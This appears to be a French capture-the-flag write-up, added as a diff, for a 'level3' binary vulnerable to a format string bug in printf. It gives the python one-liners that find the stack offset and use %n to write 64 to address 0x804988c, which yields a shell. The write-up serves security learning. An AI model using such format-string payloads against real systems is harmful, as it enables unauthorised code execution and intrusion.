@@ -1,0 +1,27 @@
+https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf
+
+La faille semble etre une injection sur printf.
+Etant qu'il n'y a pas de formatteur on peu utiliser printf pour lire et ecrire dans la stack.
+On voit une comparaison sur 0x40 et $eax apres printf, lorsqu'on set eax a 0x40 ca nous execute un shell.
+
+On commence notre exploit
+Le but au debut est de trouver  le nombre de formateurs nécessaires pour tomber à l'endroit de la stack où commence notre
+variable « msg ».
+(python -c 'print "AAAA%x%x%x%x"') | ./level3
+Le nombre est 4.
+Avec %n on peut ecrire dans la stack.
+Si on faisait 
+(python -c 'print "AAAA%4$n"') | ./level3
+On ecrirait a l'adresse 0x41414141.
+Dans le code des lignes retiennent notre attention:
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+
+Le contenu de 0x804988c est ecrit dans eax puis eax est compare avec la valeure 0x40 soit 64.
+On formatte un payload pour ecrire a l'adresse 0x804988c 
+(python -c 'print "\x8c\x98\x04\x08" + "%4$n"') | ./level3
+On regarde ce qui y a ete marqué, c'est l'output de printf donc 4.
+
+On fait donc un payload pour avoir la valeur qui nous interesse soit 64.
+(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"';cat) | ./level3
